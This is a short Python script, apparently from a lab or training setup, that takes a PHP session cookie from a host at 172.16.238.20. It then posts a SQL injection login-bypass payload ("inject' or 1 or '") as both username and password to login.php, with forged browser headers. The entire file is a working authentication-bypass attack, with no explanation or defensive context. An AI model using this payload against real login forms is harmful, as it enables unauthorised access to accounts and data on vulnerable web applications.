import requests
import time

file = '/usr/share/scripts/SQL.txt'
url = 'http://172.16.238.20'
login_url = url + '/login.php'

def get_session():
    session = requests.Session()
    r = session.get(url)
    dict = session.cookies.get_dict()
    sess_id = dict['PHPSESSID']
    return sess_id


def sqli(filename, sess_id):
    php_sess_id = 'PHPSESSID=' + sess_id
    username = "inject' or 1 or '"
    password = "inject' or 1 or '"

    mydata_login = 'username=' + username + '&password=' + password
    content_length_login = str(len(mydata_login))

    headers_login = {
                    'Host': '172.16.238.20',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Referer': 'http://172.16.238.20/login.php',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': content_length_login,
                    'Cookie': php_sess_id,
                    'Connection': 'close',
                    'Upgrade-Insecure-Requests': '1'
                }

    r_login = requests.post(login_url, data=mydata_login, headers=headers_login)

time.sleep(10)
session = get_session()
sqli(file, session)
